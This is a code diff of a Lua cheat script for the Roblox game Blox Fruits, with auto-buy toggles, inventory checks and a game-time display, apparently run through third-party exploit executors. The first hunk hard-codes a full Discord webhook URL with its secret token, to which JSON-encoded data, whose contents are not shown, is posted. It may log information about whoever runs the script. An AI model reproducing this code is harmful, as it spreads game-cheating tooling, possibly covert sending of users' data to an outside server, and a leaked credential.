@@ -60,7 +60,7 @@ local data = {
 }
 
 local jsonData = HttpService:JSONEncode(data)
-local webhookUrl = ""
+local webhookUrl = "https://discord.com/api/webhooks/1247853090057486397/roi-thQqY2Xj9WKpj9-GX0RrfFE4M3dwIA5esUCODdHC9LKWes1lUSsAwT57kWwdQC8O"
 local headers = {["Content-Type"] = "application/json"}
 request = http_request or request or HttpPost or fluxus.request or syn.request or Krnl.request or delta.request;
 local request = http_request or request or HttpPost or syn.request
@@ -2321,6 +2321,7 @@ local Info = Window:AddTab({Title = "Info", Icon = "crown"})
 
 
 local Time = Info:AddParagraph({Title = "", Content = ""})
+
 local OSDate = Info:AddParagraph({Title = "", Content = ""})
 
 local function UpdateOS()
@@ -2336,7 +2337,7 @@ local function UpdateOS()
     local result, code = pcall(function()
      return LocalizationService:GetCountryRegionForPlayerAsync(player)
      end)
-     OSDate:SetTitle(datetime.." - "..timezone.." [" .. code .. "]")
+     Time:SetDesc(datetime.." - "..timezone.." [" .. code .. "]")
     end
     spawn(function()
      while true do
@@ -2345,11 +2346,21 @@ local function UpdateOS()
      end
      end)
 
-     spawn(function()
-        while wait() do
-            Time:SetTitle("Server : " .. function8() .. " | ".. CheckMoon() .. "")
-                end
-            end)
+     function UpdateTime()
+        local GameTime = math.floor(workspace.DistributedGameTime+0.5)
+        local Hour = math.floor(GameTime/(60^2))%24
+        local Minute = math.floor(GameTime/(60^1))%60
+        local Second = math.floor(GameTime/(60^0))%60
+        Time:SetTitle("[GameTime] : Hours : "..Hour.." Min : "..Minute.." Sec : "..Second)
+        end
+        
+        spawn(function()
+        while task.wait() do
+        pcall(function()
+        UpdateTime()
+        end)
+        end
+        end)
 
      function MoonTextureId()
         if World1 then
@@ -8138,26 +8149,6 @@ Shop:AddButton({
 
     Shop:AddSection("Others")
 
-    local CheckShishui = Shop:AddParagraph({Title = "Shisui [ Status ] ", Content = "[ Locked ]"})
-    local CheckSaddi = Shop:AddParagraph({Title = "Saddi [ Status ] ", Content = "[ Locked ]"})
-    local CheckWando = Shop:AddParagraph({Title = "Wando [ Status ] ", Content = "[ Locked ]"})
-    spawn(function()
-        while task.wait() do
-        pcall(function()
-          for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventoryWeapons")) do
-          if v.Name == "Shisui" then
-                CheckShishui:SetDesc("[ Unlocked ]")
-          end
-          if v.Name == "Saddi" then
-                CheckSaddi:SetDesc("[ Unlocked ]")
-          end
-          if v.Name == "Wando" then
-                CheckWando:SetDesc("[ Unlocked ]")
-          end
-        end
-    end)
-end
-end)
 
     local BuyLengendSword = Shop:AddToggle("BuyLengendSword", {
         Title = "Buy Lengend Sword",
@@ -8179,18 +8170,6 @@ task.spawn(function()
     end
 end)
 
-local CheckTTK = Shop:AddParagraph({Title = "True Triple Katana [ Status ] ", Content = "[ Locked ]"})
-spawn(function()
-    while task.wait() do
-    pcall(function()
-      for i,v in pairs(game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("getInventoryWeapons")) do
-      if v.Name == "True Triple Katana" then
-        CheckTTK:SetTitle("[ Unlocked ]")
-      end
-      end
-    end)
-    end
-end)
 
     local BuyTTK = Shop:AddToggle("BuyTTK", {
         Title = "Buy True Triple Katana",
